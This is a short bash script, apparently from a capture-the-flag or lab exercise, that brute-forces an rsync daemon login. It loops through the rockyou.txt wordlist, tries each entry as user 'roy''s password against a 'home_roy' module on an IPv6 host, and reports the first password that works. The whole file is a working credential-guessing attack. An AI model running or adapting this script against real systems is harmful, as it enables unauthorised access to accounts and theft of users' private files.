#!/usr/bin/env bash

DIR=/root/zettasync

IP="[dead:beef::250:56ff:feb9:235f]"
PORT=8730
USER=roy
TAR=home_roy

PASSWORDS='/usr/share/wordlists/rockyou.txt'

while IFS= read -r PASS
do
  echo "Trying $PASS"
  echo $PASS > pass_file
  rsync -av --password-file pass_file rsync://$USER@$IP:$PORT/$TAR $DIR/$TAR
  if [ $? -eq 0 ]; then
    echo "[+] PASS: $PASS"
    exit
  fi
done < "$PASSWORDS"
